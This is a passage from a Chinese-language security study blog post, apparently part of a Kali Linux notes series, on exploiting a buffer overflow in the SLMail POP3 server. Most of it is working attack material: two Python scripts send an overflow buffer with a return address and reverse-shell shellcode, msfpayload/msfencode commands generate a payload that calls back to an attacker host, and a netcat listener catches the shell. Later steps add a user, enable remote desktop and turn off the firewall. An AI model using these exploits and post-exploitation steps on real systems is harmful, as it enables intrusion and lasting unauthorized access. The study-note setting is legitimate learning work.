+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;C&apos;*390</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="10">
+<li><p>FUZZING </p>
+<ul>
+<li>生成Shellcode（注意坏字符）</li>
+<li>Scratch（写Shellcode的工具）</li>
+<li>cd /usr/share/framework2</li>
+<li>./msfpayload -l</li>
+<li>./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</li>
+<li>./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b “\x00\x0a\x0d”（最后需要用”+”进行连接）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>win32_adduser 增加用户的Shellcode
+win32_bind    增加监听的进程，可以开启相应的端口
+▲ 正向的bind基本上会被防火墙过滤
+▲ 反向（reserver）的bind，服务端会开放端口，主动连接外部网络
+▲ msfencode可对Shellcode做免杀，也可以编掉坏字符，进行编码需要指定原始格式 R</code></pre></blockquote>
+<ul>
+<li>nc -vlp 443</li>
+<li>./09.py（脚本后门）▲ 2019.12.11 无法返回一个shell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x83\x61\x34&quot;+</span><br><span class="line">&quot;\x23\x83\xeb\xfc\xe2\xf4\x7f\x0b\xdf\x6e\x6b\x98\xcb\xdc\x7c\x01&quot;+</span><br><span class="line">&quot;\xbf\x4f\xa7\x45\xbf\x66\xbf\xea\x48\x26\xfb\x60\xdb\xa8\xcc\x79&quot;+</span><br><span class="line">&quot;\xbf\x7c\xa3\x60\xdf\x6a\x08\x55\xbf\x22\x6d\x50\xf4\xba\x2f\xe5&quot;+</span><br><span class="line">&quot;\xf4\x57\x84\xa0\xfe\x2e\x82\xa3\xdf\xd7\xb8\x35\x10\x0b\xf6\x84&quot;+</span><br><span class="line">&quot;\xbf\x7c\xa7\x60\xdf\x45\x08\x6d\x7f\xa8\xdc\x7d\x35\xc8\x80\x4d&quot;+</span><br><span class="line">&quot;\xbf\xaa\xef\x45\x28\x42\x40\x50\xef\x47\x08\x22\x04\xa8\xc3\x6d&quot;+</span><br><span class="line">&quot;\xbf\x53\x9f\xcc\xbf\x63\x8b\x3f\x5c\xad\xcd\x6f\xd8\x73\x7c\xb7&quot;+</span><br><span class="line">&quot;\x52\x70\xe5\x09\x07\x11\xeb\x16\x47\x11\xdc\x35\xcb\xf3\xeb\xaa&quot;+</span><br><span class="line">&quot;\xd9\xdf\xb8\x31\xcb\xf5\xdc\xe8\xd1\x45\x02\x8c\x3c\x21\xd6\x0b&quot;+</span><br><span class="line">&quot;\x36\xdc\x53\x09\xed\x2a\x76\xcc\x63\xdc\x55\x32\x67\x70\xd0\x22&quot;+</span><br><span class="line">&quot;\x67\x60\xd0\x9e\xe4\x4b\x43\xc9\x50\x4a\xe5\x09\x35\x98\xe5\x32&quot;+</span><br><span class="line">&quot;\xbd\xc2\x16\x09\xd8\xda\x29\x01\x63\xdc\x55\x0b\x24\x72\xd6\x9e&quot;+</span><br><span class="line">&quot;\xe4\x45\xe9\x05\x52\x4b\xe0\x0c\x5e\x73\xda\x48\xf8\xaa\x64\x0b&quot;+</span><br><span class="line">&quot;\x70\xaa\x61\x50\xf4\xd0\x29\xf4\xbd\xde\x7d\x23\x19\xdd\xc1\x4d&quot;+</span><br><span class="line">&quot;\xb9\x59\xbb\xca\x9f\x88\xeb\x13\xca\x90\x95\x9e\x41\x0b\x7c\xb7&quot;+</span><br><span class="line">&quot;\x6f\x74\xd1\x30\x65\x72\xe9\x60\x65\x72\xd6\x30\xcb\xf3\xeb\xcc&quot;+</span><br><span class="line">&quot;\xed\x26\x4d\x32\xcb\xf5\xe9\x9e\xcb\x14\x7c\xb1\x5c\xc4\xfa\xa7&quot;+</span><br><span class="line">&quot;\x4d\xdc\xf6\x65\xcb\xf5\x7c\x16\xc8\xdc\x53\x09\xc4\xa9\x87\x3e&quot;+</span><br><span class="line">&quot;\x67\xdc\x55\x9e\xe4\x23&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre><ol start="11">
+<li>FUZZING</li>
+</ol>
+</blockquote>
+<ul>
+<li>早期的msfpayload<ul>
+<li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
+<li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
+<li>./msfpayload win32_reverser LHOST=IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b “\x00\x0a\x0d”</li>
+</ul>
+</li>
+</ul>
+<ol start="12">
+<li>FUZZING</li>
+</ol>
+<blockquote>
+<pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
+2.查看远程桌面是否开启（我的电脑 → 属性 → 远程）
+3.apt-get install rdesktop
+4.rdesktop 远程IP
+5.nc -vlp 443 
+6.增加用户（net user 用户 password 密码）
+▲ 可以通过注册表关闭防火墙（regsnap可抓取注册表变化）</code></pre></blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" rel="next" title="Kali Linux笔记(二十六)：缓冲区溢出介绍">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(二十六)：缓冲区溢出介绍
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/photo.jpg"
+                alt="Tomas" />
+            
+              <p class="site-author-name" itemprop="name">Tomas</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tomas</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
